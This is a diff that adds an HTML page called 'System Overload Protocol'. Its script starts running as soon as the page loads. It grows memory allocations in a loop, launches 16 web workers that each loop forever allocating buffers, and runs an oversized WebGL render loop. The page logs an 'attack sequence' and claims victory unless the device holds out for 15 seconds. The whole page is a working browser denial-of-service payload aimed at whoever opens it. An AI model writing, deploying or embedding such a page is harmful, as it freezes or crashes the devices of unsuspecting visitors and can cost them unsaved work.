@@ -38,4 +38,140 @@
             border-top: 1px solid #004d4d;
             padding-top: 10px;
         }
-        
+        .log-entry {
+            margin: 3px 0;
+            color: #00ff00;
+        }
+    </style>
+</head>
+<body>
+    <div id="terminal">
+        <h1>System Overload Protocol</h1>
+        <div id="progress-container">
+            <div id="progress-bar"></div>
+        </div>
+        <div id="log-container"></div>
+    </div>
+
+<script>
+(() => {
+    const MAX_DURATION = 15000; // 15秒超时
+    let startTime = Date.now();
+    let progress = 0;
+    let crashDetected = false;
+    
+    const attackMethods = [
+        {
+            name: 'Memory Allocation',
+            run: () => {
+                const chunks = [];
+                let size = 256 * 1024 * 1024; // 256MB
+                const interval = setInterval(() => {
+                    try {
+                        chunks.push(new ArrayBuffer(size));
+                        size *= 1.2;
+                        updateLog(`Allocated ${(size/1048576).toFixed(1)}MB`);
+                    } catch(e) {
+                        size = Math.max(1e6, size * 0.8);
+                    }
+                }, 100);
+                return () => clearInterval(interval);
+            }
+        },
+        {
+            name: 'Compute Threads',
+            run: () => {
+                const workers = [];
+                const code = `while(1){new ArrayBuffer(1024)}`;
+                for(let i=0; i<16; i++) {
+                    const worker = new Worker(URL.createObjectURL(new Blob([code])));
+                    workers.push(worker);
+                }
+                updateLog(`Launched ${workers.length} workers`);
+                return () => workers.forEach(w => w.terminate());
+            }
+        },
+        {
+            name: 'Rendering Stress',
+            run: () => {
+                const canvas = document.createElement('canvas');
+                canvas.width = 4096;
+                canvas.height = 4096;
+                document.body.appendChild(canvas);
+                const gl = canvas.getContext('webgl');
+                
+                let frameCount = 0;
+                const render = () => {
+                    const buffer = new Float32Array(4096*4096*4);
+                    gl.clear(gl.COLOR_BUFFER_BIT);
+                    gl.drawArrays(gl.POINTS, 0, buffer.length);
+                    frameCount++;
+                    requestAnimationFrame(render);
+                };
+                render();
+                return () => canvas.remove();
+            }
+        }
+    ];
+
+    const cleanupHandlers = [];
+    const logContainer = document.getElementById('log-container');
+    
+    function updateProgress(p) {
+        progress = Math.min(100, progress + p);
+        document.getElementById('progress-bar').style.width = progress + '%';
+    }
+
+    function updateLog(message) {
+        const entry = document.createElement('div');
+        entry.className = 'log-entry';
+        entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+        logContainer.appendChild(entry);
+        logContainer.scrollTop = logContainer.scrollHeight;
+    }
+
+    function checkCrashState() {
+        if(Date.now() - startTime > MAX_DURATION && !crashDetected) {
+            showSurvivorMessage();
+        }
+    }
+
+    function showSurvivorMessage() {
+        document.body.innerHTML = `
+            <div style="padding:20px;text-align:center">
+                <h2 style="color:#00ff00">System Stability Report</h2>
+                <p>你的设备防护太过强大</p>
+                <p>我们无法打破</p>
+            </div>
+        `;
+    }
+
+    // 启动攻击序列
+    attackMethods.forEach((method, index) => {
+        setTimeout(() => {
+            updateLog(`Starting: ${method.name}`);
+            cleanupHandlers.push(method.run());
+            updateProgress((100 / attackMethods.length) * (index + 1));
+        }, index * 2000);
+    });
+
+    // 启动崩溃检测
+    const crashCheckInterval = setInterval(() => {
+        try {
+            // 尝试DOM操作检测主线程状态
+            document.title = Date.now().toString(16);
+            checkCrashState();
+        } catch(e) {
+            crashDetected = true;
+            clearInterval(crashCheckInterval);
+        }
+    }, 500);
+
+    // 清理资源
+    window.addEventListener('beforeunload', () => {
+        cleanupHandlers.forEach(fn => fn());
+    });
+})();
+</script>
+</body>
+</html>
